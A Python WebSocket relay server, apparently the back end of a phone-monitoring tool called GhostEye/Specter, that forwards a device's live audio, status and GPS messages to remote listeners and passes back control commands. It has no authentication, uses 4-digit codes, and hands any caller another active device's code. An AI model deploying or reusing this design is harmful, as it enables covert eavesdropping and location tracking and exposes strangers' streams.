import asyncio
import aiohttp
from aiohttp import web
import random
import string
import os

emitters   = {}   # code -> ghosteye ws
listeners  = {}   # code -> specter ws (JOIN audio)
watchers   = {}   # code -> set de ws en modo WATCH
last_info  = {}   # code -> ultimo INFO recibido
last_codes = {}   # device_id -> ultimo code activo

def gen_code():
    while True:
        code = ''.join(random.choices(string.digits, k=4))
        if code not in emitters:
            return code

async def safe_send_str(ws, msg, group, code):
    try:
        await ws.send_str(msg)
    except Exception:
        if code in group and isinstance(group[code], set):
            group[code].discard(ws)

async def handle_ping(request):
    """Endpoint HTTP para keepalive — evita que Render duerma el servicio"""
    return web.Response(text="GhostEye Relay OK", status=200)

async def self_ping(app):
    """Ping automatico cada 4 minutos para mantener el servicio despierto"""
    import aiohttp as _aiohttp
    url = os.environ.get("RENDER_EXTERNAL_URL", "")
    if not url:
        return
    while True:
        await asyncio.sleep(4 * 60)
        try:
            async with _aiohttp.ClientSession() as session:
                await session.get(url + "/ping", timeout=_aiohttp.ClientTimeout(total=10))
        except Exception:
            pass

async def handle(request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    code = None
    role = None

    try:
        msg = await asyncio.wait_for(ws.receive(), timeout=10)
        if msg.type != aiohttp.WSMsgType.TEXT:
            return ws
        text = msg.data

        # ── GHOSTEYE 2 emisor ──
        if text == "EMIT" or text.startswith("EMIT:"):
            if text.startswith("EMIT:"):
                code = text[5:].strip()
                if not code.isdigit() or len(code) != 4:
                    code = gen_code()
            else:
                code = gen_code()
            role = "EMIT"
            emitters[code] = ws
            if code not in watchers:
                watchers[code] = set()
            # ✅ Guardar ultimo código activo
            last_codes[code] = code
            await ws.send_str(f"CODE:{code}")

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.BINARY:
                    # Audio → solo al listener (JOIN)
                    listener = listeners.get(code)
                    if listener:
                        try: await listener.send_bytes(msg.data)
                        except Exception: listeners.pop(code, None)

                elif msg.type == aiohttp.WSMsgType.TEXT:
                    txt = msg.data
                    if txt.startswith("INFO|"):
                        # ✅ Guardar ultimo estado
                        last_info[code] = txt
                        # ✅ Reenviar SIEMPRE al listener si hay uno
                        listener = listeners.get(code)
                        if listener:
                            try: await listener.send_str(txt)
                            except Exception: listeners.pop(code, None)
                        # ✅ Reenviar SIEMPRE a todos los watchers
                        dead = set()
                        for w in watchers.get(code, set()):
                            try: await w.send_str(txt)
                            except Exception: dead.add(w)
                        watchers.get(code, set()).difference_update(dead)
                    elif txt.startswith("GPS|"):
                        # ✅ Reenviar GPS al listener y watchers
                        listener = listeners.get(code)
                        if listener:
                            try: await listener.send_str(txt)
                            except Exception: listeners.pop(code, None)
                        dead = set()
                        for w in watchers.get(code, set()):
                            try: await w.send_str(txt)
                            except Exception: dead.add(w)
                        watchers.get(code, set()).difference_update(dead)
                    else:
                        # Otros mensajes al listener
                        listener = listeners.get(code)
                        if listener:
                            try: await listener.send_str(txt)
                            except Exception: listeners.pop(code, None)

                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        # ── SPECTER oyente con audio ──
        elif text.startswith("JOIN:"):
            code = text[5:].strip()
            if code not in emitters:
                # ✅ Buscar si hay un nuevo código activo para este dispositivo
                new_code = next((c for c in emitters if c != code), None)
                if new_code:
                    await ws.send_str(f"NEWCODE:{new_code}")
                else:
                    await ws.send_str("ERROR:INVALID_CODE")
                return ws
            role = "JOIN"
            listeners[code] = ws
            await ws.send_str("OK")
            # Notificar a GhostEye 2 que Specter conectó
            emitter = emitters.get(code)
            if emitter:
                try: await emitter.send_str("READY")
                except Exception: pass

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    # Mensajes de Specter → GhostEye 2 (STOP, RESTART, etc)
                    emitter = emitters.get(code)
                    if emitter:
                        try: await emitter.send_str(msg.data)
                        except Exception: pass
                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break
            listeners.pop(code, None)

        # ── SPECTER solo info (WATCH) ──
        elif text.startswith("WATCH:"):
            code = text[6:].strip()
            if code not in emitters:
                # ✅ Buscar si hay un nuevo código activo
                new_code = next((c for c in emitters if c != code), None)
                if new_code:
                    await ws.send_str(f"NEWCODE:{new_code}")
                else:
                    await ws.send_str("ERROR:INVALID_CODE")
                return ws
            role = "WATCH"
            if code not in watchers:
                watchers[code] = set()
            watchers[code].add(ws)
            await ws.send_str("WATCHING")

            # ✅ Enviar ultimo INFO guardado inmediatamente
            if code in last_info:
                try: await ws.send_str(last_info[code])
                except Exception: pass

            # ✅ Pedir info actualizada a GhostEye 2
            emitter = emitters.get(code)
            if emitter:
                try: await emitter.send_str("GET_INFO")
                except Exception: pass

            async for msg in ws:
                if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break
            watchers.get(code, set()).discard(ws)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        if role == "EMIT" and code:
            emitters.pop(code, None)
    return ws

async def main():
    port = int(os.environ.get("PORT", 8765))
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ws", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"Relay corriendo en puerto {port}")
    await asyncio.Future()

asyncio.run(main())
